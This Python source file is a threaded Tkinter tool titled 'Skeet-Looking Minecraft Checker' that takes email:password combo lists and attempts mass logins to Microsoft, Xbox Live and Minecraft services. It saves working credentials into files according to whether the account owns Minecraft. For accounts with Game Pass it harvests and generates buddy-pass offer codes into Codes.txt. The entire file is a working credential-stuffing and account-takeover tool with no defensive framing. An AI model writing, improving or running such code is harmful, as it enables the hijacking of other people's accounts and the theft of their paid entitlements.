import os
import re
import time
import threading
import urllib3
import json
import concurrent.futures
import sys
import queue
import ctypes
import requests
from datetime import datetime, timezone
from tkinter import Tk, Menu, Frame, BOTH, filedialog, Scrollbar, VERTICAL, HORIZONTAL, END, LEFT, RIGHT, Y, X, Text, PanedWindow
from tkinter.ttk import Button, Label, Style, Treeview
from tkinter.font import Font
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, init as colorama_init

# ===================================
# GLOBAL SETTINGS & FAST MODE
# ===================================
MAX_WORKERS = 100            # Maximum number of threads to use
SLEEP_DELAY = 0.1            # Delay between retries
MAX_ATTEMPTS = 10            # Maximum retry attempts
NO_PROGRESS_TIMEOUT = 10     # Refresh batch if no progress in 10 sec

# ===================================
# RESULTS FOLDER SETUP
# ===================================
results_dir = "results"
if not os.path.exists(results_dir):
    os.makedirs(results_dir)

def get_result_path(filename):
    """Return the full path for a file stored inside the results folder."""
    return os.path.join(results_dir, filename)

# ===================================
# GLOBALS FOR STATS & LOGGING
# ===================================
cpm = 0
checked = 0
Combos = []  # List of combos remaining to process
hits = 0
bad = 0
sfa = 0
mfa = 0
twofa = 0
xgp = 0
xgpu = 0
vm = 0
retries = 0
errors = 0
other = 0
logo = "Your Logo Here"

last_progress = time.time()
account_statuses = {}   # Per-account status dictionary
file_lock = threading.Lock()  # For thread-safe file writes

# ===================================
# HIDE CONSOLE (OPTIONAL)
# ===================================
# Commenting out the console-hiding block to help with debugging:
# if os.name == 'nt':
#     try:
#         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
#     except Exception:
#         pass

# ===================================
# INITIALIZE COLORAMA & DISABLE WARNINGS
# ===================================
colorama_init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# URL for authentication tokens
sFTTag_url = (
    "https://login.live.com/oauth20_authorize.srf?"
    "client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&"
    "scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
)

# Global file path for combos (set via the GUI)
combo_file_path = None

# Global counters & lock for thread-safe updates
total_processed = 0
total_success = 0
counter_lock = threading.Lock()

# Thread-safe queue for GUI logging
log_queue = queue.Queue()

# ===================================
# HELPER FUNCTIONS FOR FILE HANDLING
# ===================================
def is_email_in_file(filename, email):
    norm_email = email.strip().lower()
    path = get_result_path(filename)
    gui_print(Fore.MAGENTA + f"[DEBUG] Checking file: {os.path.abspath(path)} for email: {norm_email}")
    if not os.path.exists(path):
        gui_print(Fore.MAGENTA + f"[DEBUG] File {os.path.abspath(path)} does not exist. Creating file.")
        try:
            with open(path, "w", encoding="utf-8") as f:
                pass
        except Exception as e:
            gui_print(Fore.RED + f"[ERROR] Could not create file {os.path.abspath(path)}: {e}")
        return False
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.split(":")
                if parts and len(parts) > 0 and parts[0].strip().lower() == norm_email:
                    gui_print(Fore.MAGENTA + f"[DEBUG] Found email in file: {line.strip()}")
                    return True
    except Exception as e:
        gui_print(Fore.RED + f"[ERROR] Checking {os.path.abspath(path)} for {email}: {e}")
    return False

def add_email_to_file(filename, email, extra_info=""):
    with file_lock:
        if not is_email_in_file(filename, email):
            try:
                path = get_result_path(filename)
                gui_print(Fore.BLUE + f"[DEBUG] {email} not found in {os.path.abspath(path)}. Adding entry.")
                with open(path, "a", encoding="utf-8") as f:
                    f.write(f"{email}:{extra_info}\n")
                    f.flush()
            except Exception as e:
                gui_print(Fore.RED + f"[ERROR] Failed writing to {get_result_path(filename)}: {e}")
        else:
            gui_print(Fore.BLUE + f"[DEBUG] {email} already exists in {get_result_path(filename)}; skipping duplicate entry.")

# ===================================
# GUI LOGGING FUNCTIONS
# ===================================
def gui_log(message):
    log_queue.put(message)

def poll_log_queue(text_widget):
    try:
        while True:
            message = log_queue.get_nowait()
            text_widget.config(state="normal")
            text_widget.insert(END, message + "\n")
            text_widget.see(END)
            text_widget.config(state="disabled")
    except queue.Empty:
        pass
    text_widget.after(1000, poll_log_queue, text_widget)

def gui_print(*args, **kwargs):
    global log_line_counter
    try:
        log_line_counter
    except NameError:
        log_line_counter = 0
    log_line_counter += 1
    message = " ".join(str(a) for a in args)
    numbered_message = f"[{log_line_counter:03}] {message}"
    gui_log(numbered_message)
    # Uncomment the following line to also print to the console:
    # sys.__stdout__.write(numbered_message + "\n")

# ===================================
# FILE-BASED FUNCTIONS
# ===================================
def read_prechecked_accounts():
    prechecked = set()
    for filename in ["setname.txt", "nosetname.txt"]:
        path = get_result_path(filename)
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    for line in f:
                        parts = line.split(":")
                        if parts and len(parts) > 0:
                            prechecked.add(parts[0].strip().lower())
            except Exception as e:
                gui_print(Fore.RED + f"Error reading {os.path.abspath(path)}: {e}")
    return prechecked

def read_combos(file_path):
    prechecked = read_prechecked_accounts()
    combos = []
    try:
        with open(file_path, 'r', encoding="utf-8") as file:
            for line in file:
                parts = line.strip().split(':')
                if len(parts) >= 2:
                    email = parts[0].strip().lower()
                    if email not in prechecked:
                        combos.append(parts)
    except Exception as e:
        gui_print(Fore.RED + f"Error reading combos file: {e}")
    global Combos
    Combos = combos
    return combos

# ===================================
# RETRY-BASED MINECRAFT TOKEN FUNCTION
# ===================================
def mc_token_retry(session, uhs, xsts_token):
    retry_strategy = Retry(
        total=MAX_ATTEMPTS,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)
    identity_token = f"XBL3.0 x={uhs.strip()};{xsts_token.strip()}"
    try:
        response = session.post(
            'https://api.minecraftservices.com/authentication/login_with_xbox',
            json={'identityToken': identity_token},
            headers={'Content-Type': 'application/json'},
            timeout=15
        )
        if response.status_code == 200:
            data = response.json()
            access_token = data.get('access_token')
            if access_token:
                return access_token
            else:
                gui_print(Fore.RED + f"mc_token_retry did not return access token, response: {data}")
        else:
            gui_print(Fore.RED + f"mc_token_retry failed with status {response.status_code}: {response.text}")
    except Exception as e:
        gui_print(Fore.RED + f"Exception in mc_token_retry: {e}")
    return None

# ===================================
# CORE AUTHENTICATION FUNCTIONS
# ===================================
def authenticate(email, password, tries=0):
    global total_processed, total_success, checked, last_progress
    with counter_lock:
        account_statuses[email] = "Starting..."
    session = requests.Session()
    session.verify = True
    try:
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if urlPost is None or sFTTag is None:
            gui_print(Fore.RED + f"Failed to retrieve required tokens for {email}")
            with counter_lock:
                account_statuses[email] = "Token retrieval failed"
            return
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token not in ("None", None):
            gui_print(Fore.YELLOW + f"{email}:{password} - RPS_SUCCESS")
            with counter_lock:
                account_statuses[email] = "RPS_SUCCESS"
            xbox_login = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": token
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=15
            )
            js = xbox_login.json()
            xbox_token = js.get('Token')
            if xbox_token is not None:
                gui_print(Fore.WHITE + f"{email}:{password} - XBOXTOKEN_SUCCESS")
                with counter_lock:
                    account_statuses[email] = "XBOXTOKEN_SUCCESS"
                uhs = js['DisplayClaims']['xui'][0]['uhs']
                xsts = session.post(
                    'https://xsts.auth.xboxlive.com/xsts/authorize',
                    json={
                        "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                        "RelyingParty": "rp://api.minecraftservices.com/",
                        "TokenType": "JWT"
                    },
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                    timeout=15
                )
                js = xsts.json()
                xsts_token = js.get('Token')
                if xsts_token is not None:
                    gui_print(Fore.WHITE + f"{email}:{password} - XSTSTOKEN_SUCCESS")
                    with counter_lock:
                        account_statuses[email] = "XSTSTOKEN_SUCCESS"
                    access_token = mc_token_retry(session, uhs, xsts_token)
                    if access_token is not None:
                        gui_print(Fore.WHITE + f"{email}:{password} - ACCTOKEN_SUCCESS")
                        with counter_lock:
                            total_success += 1
                            account_statuses[email] = "ACCTOKEN_SUCCESS"
                        # Check Minecraft profile and import accordingly:
                        check_minecraft_profile(session, email, password, access_token)
                        # Check Xbox Game Pass entitlement and retrieve codes if valid:
                        check_xbox_game_pass(session, email, password, access_token, xbox_token)
    except Exception as e:
        gui_print(Fore.RED + f"Error for {email}:{password} - {e}")
        with counter_lock:
            account_statuses[email] = f"Error: {e}"
    finally:
        with counter_lock:
            total_processed += 1
        global checked
        checked += 1
        last_progress = time.time()
        session.close()

def get_urlPost_sFTTag(session, max_attempts=MAX_ATTEMPTS):
    attempts = 0
    while attempts < max_attempts:
        try:
            r = session.get(sFTTag_url, timeout=15)
            text = r.text
            match = re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match2 = re.search(r"urlPost:'(.+?)'", text, re.S)
                if match2:
                    return match2.group(1), sFTTag, session
        except Exception as e:
            gui_print(Fore.RED + f"Error in get_urlPost_sFTTag: {e}")
        attempts += 1
        time.sleep(SLEEP_DELAY)
    gui_print(Fore.RED + "Failed to retrieve urlPost and sFTTag after maximum attempts.")
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
    try:
        login_request = session.post(
            urlPost, data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=True, timeout=15
        )
    except Exception as e:
        gui_print(Fore.RED + f"Error posting login data for {email}: {e}")
        return "None", session

    if '#' in login_request.url and login_request.url != sFTTag_url:
        token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
        if token != "None":
            return token, session
    elif 'cancel?mkt=' in login_request.text:
        try:
            ipt_match = re.search(r'(?<="ipt" value=")(.+?)(?=")', login_request.text)
            pprid_match = re.search(r'(?<="pprid" value=")(.+?)(?=")', login_request.text)
            uaid_match = re.search(r'(?<="uaid" value=")(.+?)(?=")', login_request.text)
            if ipt_match and pprid_match and uaid_match:
                data = {
                    'ipt': ipt_match.group(1),
                    'pprid': pprid_match.group(1),
                    'uaid': uaid_match.group(1)
                }
                action_match = re.search(r'(?<=id="fmHF" action=")(.+?)(?=")', login_request.text)
                if action_match:
                    ret = session.post(
                        action_match.group(0),
                        data=data, allow_redirects=True, timeout=15
                    )
                    return_url_match = re.search(r'(?<="recoveryCancel":{"returnUrl":")(.+?)(?=",)', ret.text)
                    if return_url_match:
                        fin = session.get(
                            return_url_match.group(0),
                            allow_redirects=True, timeout=15
                        )
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                        if token != "None":
                            return token, session
        except Exception as e:
            gui_print(Fore.RED + f"Error in get_xbox_rps for {email}: {e}")
    return "None", session

# ===================================
# MINECRAFT PROFILE CHECK
# ===================================
def check_minecraft_profile(session, email, password, token):
    """
    Check the Minecraft profile for the account.
    - If the response status is 200 (account has a profile, i.e. purchased), add the account to setname.txt.
    - If the response status is 404 (no profile), add the account to nosetname.txt.
    """
    try:
        response = session.get(
            "https://api.minecraftservices.com/minecraft/profile",
            headers={"Authorization": f"Bearer {token}"},
            timeout=15
        )
        if response.status_code == 200:
            profile = response.json()
            mc_name = profile.get("name", "Unknown")
            gui_print(Fore.LIGHTGREEN_EX + f"{email}:{password} - Minecraft account purchased: {mc_name}")
            # Import accounts with a set name into setname.txt:
            add_email_to_file("setname.txt", f"{email}:{password}", extra_info=f" {mc_name}")
        elif response.status_code == 404:
            gui_print(Fore.RED + f"{email}:{password} - Minecraft account not purchased (nosetname)")
            add_email_to_file("nosetname.txt", f"{email}:{password}")
        else:
            gui_print(Fore.RED + f"{email}:{password} - Error checking Minecraft profile: {response.status_code}")
    except Exception as e:
        gui_print(Fore.RED + f"{email}:{password} - Exception checking Minecraft profile: {e}")

# ===================================
# XBOX GAME PASS CHECK & CODE RETRIEVAL
# ===================================
def check_xbox_game_pass(session, email, password, token, xbox_token):
    try:
        checkrq = session.get(
            "https://api.minecraftservices.com/entitlements/mcstore",
            headers={"Authorization": f"Bearer {token}"},
            verify=False,
            timeout=15
        )
        if checkrq.status_code == 200:
            text = checkrq.text.lower()
            if 'product_game_pass_ultimate' in text or 'product_game_pass_pc' in text:
                retrieve_xbox_codes(session, email, password, xbox_token)
            else:
                gui_print(Fore.RED + f"{email}:{password} - No Xbox Game Pass entitlement found")
        else:
            gui_print(Fore.RED + f"{email}:{password} - Error checking entitlements: {checkrq.status_code}")
    except Exception as e:
        gui_print(Fore.RED + f"{email}:{password} - Exception checking Xbox Game Pass: {e}")

def retrieve_xbox_codes(session, email, password, xbox_token):
    codes = set()
    try:
        xsts_resp = session.post(
            "https://xsts.auth.xboxlive.com/xsts/authorize",
            json={
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "http://mp.microsoft.com/",
                "TokenType": "JWT"
            },
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            timeout=15
        )
        js = xsts_resp.json()
        uhss = js['DisplayClaims']['xui'][0]['uhs']
        xsts_token = js.get('Token')
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
            "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
            "Origin": "https://www.xbox.com",
            "Priority": "u=1, i",
            "Referer": "https://www.xbox.com/",
            "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
            "X-Ms-Api-Version": "1.0"
        }
        r = session.get("https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers", headers=headers, timeout=15)
        current_time = datetime.now(timezone.utc)
        if r.status_code == 200 and 'offerid' in r.text.lower():
            offers = r.json().get("offers", [])
            with file_lock:
                try:
                    with open(get_result_path("Codes.txt"), "a", encoding="utf-8") as f:
                        for offer in offers:
                            expiration = datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00'))
                            if expiration > current_time:
                                status = "Claimed" if offer.get("claimed", False) else "Not Claimed"
                                f.write(f"{offer['offerId']} - {status}\n")
                                codes.add(offer['offerId'])
                except Exception as e:
                    gui_print(Fore.RED + f"Failed writing Codes.txt: {e}")
            gui_print(Fore.BLUE + f"{email}:{password} - Existing Xbox codes retrieved")
            attempt = 0
            while len(codes) < 5 and attempt < MAX_ATTEMPTS:
                attempt += 1
                try:
                    r = session.post("https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB", headers=headers, timeout=15)
                    if r.status_code == 200 and 'offerId' in r.text:
                        offers = r.json().get("offers", [])
                        with file_lock:
                            try:
                                with open(get_result_path("Codes.txt"), "a", encoding="utf-8") as f:
                                    for offer in offers:
                                        expiration = datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00'))
                                        if expiration > current_time:
                                            status = "Claimed" if offer.get("claimed", False) else "Not Claimed"
                                            f.write(f"{offer['offerId']} - {status}\n")
                                            codes.add(offer["offerId"])
                            except Exception as e:
                                gui_print(Fore.RED + f"Failed writing Codes.txt: {e}")
                    else:
                        break
                except Exception as e:
                    gui_print(Fore.RED + f"{email}:{password} - Exception generating Xbox codes: {e}")
                time.sleep(SLEEP_DELAY)
            gui_print(Fore.BLUE + f"{email}:{password} - Xbox Game Pass codes retrieved and saved.")
        else:
            attempt = 0
            while attempt < MAX_ATTEMPTS:
                attempt += 1
                try:
                    r = session.post("https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB", headers=headers, timeout=15)
                    if r.status_code == 200 and 'offerId' in r.text:
                        offers = r.json().get("offers", [])
                        with file_lock:
                            try:
                                with open(get_result_path("Codes.txt"), "a", encoding="utf-8") as f:
                                    for offer in offers:
                                        expiration = datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00'))
                                        if expiration > current_time:
                                            status = "Claimed" if offer.get("claimed", False) else "Not Claimed"
                                            f.write(f"{offer['offerId']} - {status}\n")
                                            codes.add(offer["offerId"])
                            except Exception as e:
                                gui_print(Fore.RED + f"Failed writing Codes.txt: {e}")
                    else:
                        break
                except Exception as e:
                    gui_print(Fore.RED + f"{email}:{password} - Exception generating Xbox codes: {e}")
                time.sleep(SLEEP_DELAY)
            gui_print(Fore.BLUE + f"{email}:{password} - Xbox Game Pass codes generated and saved.")
    except Exception as e:
        gui_print(Fore.RED + f"{email}:{password} - Exception in Xbox Game Pass check: {e}")

# ===================================
# MAIN PROCESSING FUNCTION (AUTO-REFRESH)
# ===================================
def process_combos(file_path):
    global last_progress
    while True:
        try:
            last_progress = time.time()  # Reset progress timer
            combos = read_combos(file_path)
            if not combos:
                gui_print("No unprocessed combos remain. Waiting for new combos...")
                time.sleep(5)
                continue

            max_workers = min(MAX_WORKERS, len(combos))
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(authenticate, email, password) for email, password in combos]
                done, not_done = concurrent.futures.wait(futures, timeout=NO_PROGRESS_TIMEOUT)
                if not_done and (time.time() - last_progress > NO_PROGRESS_TIMEOUT):
                    gui_print("No progress detected for 10 seconds. Auto-refreshing batch.")
                    for future in not_done:
                        future.cancel()
                    continue  # Restart loop to refresh combos
                else:
                    concurrent.futures.wait(futures)
            gui_print("Batch complete, refreshing unprocessed combos.")
            time.sleep(0.5)
        except Exception as e:
            gui_print(Fore.RED + f"Error in process_combos loop: {e}")
            time.sleep(2)

# ===================================
# TKINTER GUI APPLICATION
# ===================================
class Application(Frame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master
        self.configure_gui()
        self.create_widgets()
        poll_log_queue(self.log_text)
        self.poll_counters()
        self.update_stats_gui()
        self.update_account_list()

    def configure_gui(self):
        self.master.title("Skeet-Looking Minecraft Checker")
        try:
            self.master.state("zoomed")
        except Exception:
            self.master.geometry("1024x768")
        self.master.configure(bg="#121212")
        style = Style()
        style.theme_use("clam")

        menu_bar = Menu(self.master)
        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="Exit", command=self.master.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)
        self.master.config(menu=menu_bar)

    def create_widgets(self):
        self.custom_font = Font(family="Consolas", size=12)
        control_frame = Frame(self.master, bg="#1e1e1e")
        control_frame.pack(fill=X, padx=10, pady=5)
        self.select_combo_btn = Button(control_frame, text="Select Combos File", command=self.select_combo_file)
        self.select_combo_btn.pack(side=LEFT, padx=5)
        self.start_btn = Button(control_frame, text="Start", command=self.start_processing)
        self.start_btn.pack(side=LEFT, padx=5)
        self.status_label = Label(control_frame, text="Status: Waiting...", background="#1e1e1e", foreground="white")
        self.status_label.pack(side=RIGHT, padx=5)

        paned = PanedWindow(self.master, orient="horizontal")
        paned.pack(fill=BOTH, expand=True, padx=10, pady=10)

        left_frame = Frame(paned)
        self.account_tree = Treeview(left_frame, columns=("Status",), show="headings")
        self.account_tree.heading("Status", text="Status")
        self.account_tree.pack(fill=BOTH, expand=True)
        left_scroll = Scrollbar(left_frame, orient=VERTICAL, command=self.account_tree.yview)
        self.account_tree.configure(yscrollcommand=left_scroll.set)
        left_scroll.pack(side=RIGHT, fill=Y)
        paned.add(left_frame, weight=1)

        right_frame = Frame(paned)
        self.log_text = Text(right_frame, wrap="word", state="disabled", font=self.custom_font, bg="#1e1e1e", fg="#dcdcdc")
        self.log_text.pack(fill=BOTH, expand=True)
        log_scroll = Scrollbar(right_frame, orient=VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=log_scroll.set)
        log_scroll.pack(side=RIGHT, fill=Y)
        paned.add(right_frame, weight=2)

    def select_combo_file(self):
        global combo_file_path
        file_path = filedialog.askopenfilename(title="Select Combos File", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
        if file_path:
            combo_file_path = file_path
            gui_log(f"Selected combos file: {combo_file_path}")
            self.status_label.config(text="Status: Combo file selected.")

    def start_processing(self):
        if combo_file_path is None:
            gui_log("Please select a combos file first.")
            self.status_label.config(text="Status: No combo file selected.")
            return
        threading.Thread(target=process_combos, args=(combo_file_path,), daemon=True).start()
        gui_log("Started processing combos...")
        self.status_label.config(text="Status: Processing...")

    def poll_counters(self):
        with counter_lock:
            self.status_label.config(text=f"Status: Processed: {total_processed} | Success: {total_success}")
        self.master.after(1000, self.poll_counters)

    def update_stats_gui(self):
        global cpm, checked, Combos, hits, bad, sfa, mfa, twofa, xgp, xgpu, vm, retries, errors, other
        cmp1 = cpm
        cpm = 0
        stats_text = (
            f"Checked: {checked}/{len(Combos)} | Hits: {hits} | Bad: {bad} | 2FA: {twofa} | "
            f"Xbox GP: {xgp} | Xbox GP Ultimate: {xgpu} | Valid Mail: {vm} | Retries: {retries} | Errors: {errors}"
        )
        self.status_label.config(text=stats_text)
        self.master.after(1000, self.update_stats_gui)

    def update_account_list(self):
        self.account_tree.delete(*self.account_tree.get_children())
        with counter_lock:
            for email, status in account_statuses.items():
                self.account_tree.insert("", END, values=(f"{email}: {status}",))
        self.master.after(1000, self.update_account_list)

# ===================================
# OPTIONAL CONSOLE STATS REFRESH
# ===================================
def cuiscreen():
    global cpm, checked, Combos, hits, bad, sfa, mfa, twofa, xgp, xgpu, vm, retries, errors, other, logo
    while True:
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
            cmp1 = cpm
            cpm = 0
            print(logo)
            print(f"Processed: {checked}/{len(Combos)}")
            print(f"Hits: {hits}")
            print(f"Bad: {bad}")
            print(f"SFA: {sfa}")
            print(f"MFA: {mfa}")
            print(f"2FA: {twofa}")
            print(f"Xbox GP: {xgp}")
            print(f"Xbox GP Ultimate: {xgpu}")
            print(f"Valid Mail: {vm}")
            print(f"Retries: {retries}")
            print(f"Errors: {errors}")
            print(f"Cpm: {cmp1 * 60}")
        except Exception as e:
            print(f"Error in console update: {e}")
        time.sleep(1)

# ===================================
# MAIN ENTRY POINT
# ===================================
def main():
    threading.Thread(target=cuiscreen, daemon=True).start()  # Optional console stats refresh
    root = Tk()
    app = Application(root)
    root.mainloop()

if __name__ == "__main__":
    main()
